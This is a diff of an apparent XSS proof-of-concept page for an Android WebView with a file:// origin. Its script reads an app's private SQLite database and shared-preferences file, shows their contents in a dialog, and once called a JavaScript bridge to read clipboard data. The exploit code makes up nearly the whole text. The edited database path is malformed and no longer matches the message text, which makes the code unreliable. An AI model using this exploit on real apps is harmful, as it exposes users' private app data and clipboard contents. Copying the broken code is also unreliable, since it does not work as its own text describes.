@@ -4,7 +4,7 @@
  
 <script>
 /* canonical XSS proof-of-concept */
-alert(QuoraAndroid.getClipboardData());
+alert(1);
   
 
 /* after you press OK, the second dialog shows what the page could reach */
@@ -17,7 +17,7 @@ function grab(p){
     return x.responseText;
   } catch (e) { return null; }
 }
-var db = grab('file:///data/data/dk.royalarena.app/databases/ecp_mobile');
+var db = grab('file:///data/data/dk.royalarena.app/databasesdb_default.sqlite');
 var pf = grab('file:///data/data/dk.royalarena.app/shared_prefs/ECP.xml');
 var m = "Ecubix WebView, file:// origin\n\n";
 m += db ? "private DB  ecp_mobile = " + db.length + " bytes\n  " + db.substring(0,15) + "\n\n"
